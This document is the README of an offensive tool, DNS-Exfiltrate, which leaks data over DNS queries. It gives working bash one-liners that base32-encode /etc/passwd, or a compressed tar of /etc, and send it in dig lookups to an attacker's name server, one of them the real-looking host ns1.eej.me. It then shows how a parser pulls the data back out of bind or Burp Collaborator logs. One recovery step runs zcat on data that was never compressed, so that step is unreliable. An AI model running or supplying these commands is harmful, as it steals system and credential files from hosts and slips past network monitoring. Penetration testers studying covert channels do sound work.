# DNS-Exfiltrate

Parses bind query or Private Burp Collaborator logs to exfiltrate data. Note that you will get more reliable results by specifying the name server via `dig @`...

Use cases (bash):

## Exfiltrate a file:

```
cat /etc/passwd | base32 -w 63 |tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
```

To recover the file (on a bind DNS server):

```
./dns-parse.py <DNS Name> query.log bind | base32 -d | zcat
```

To recover the file (on a private Burp Collaborator server):

```
./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d | zcat 
```

## Exfiltrate a compressed file:

```
cat /etc/passwd | gzip - | base32 -w 63 |tr -d = | while read a; do dig @<DNS Server> $a.<DNS Server>; done;
```

To recover/unzip the file (on a bind DNS server):

```
./dns-parse.py <DNS Name> query.log bind | base32 -d | zcat
```

To recover/unzip the file (on a private Burp Collaborator server):

  ```
./dns-parse.py <DNS Name> collaborator.log collaborator | base32 -d | zcat 
```

## Exfiltrate a compressed tar archive of a directory:

```
tar czf - /etc | base32 -w 63 |tr -d =| while read a; do dig @ns1.eej.me $a.e.ns1.eej.me; done;
```
